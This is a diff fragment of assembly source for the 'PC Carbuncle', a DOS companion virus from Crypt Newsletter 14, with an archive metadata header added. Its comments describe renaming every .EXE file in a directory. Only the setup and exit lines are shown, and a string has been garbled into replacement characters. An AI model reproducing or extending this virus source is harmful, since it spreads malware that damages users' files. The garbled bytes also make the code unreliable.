@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      C
+; type      asm
+; cve       ‚Äî
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     ‚Äî
+; ------------------------------------------------------------
 ;The PC CARBUNCLE VIRUS - a companion virus for Crypt Newsletter 14                
 ;The PC Carbuncle is a "toy" virus which will search out every .EXEfile
 ;in the current directory, rename it with a .CRP [for Crypt] extent and
@@ -22,7 +33,7 @@
 		org 100h
 begin:
 		jmp     vir_start
-		db     '·ù.ö‚NstÜdâMñ$'      ; name
+		db     'ÔøΩ.ÔøΩÔøΩNstÔøΩdÔøΩMÔøΩ$'      ; name
 	      
 exit:
 		mov     ah, 4Ch              ; exit to DOS
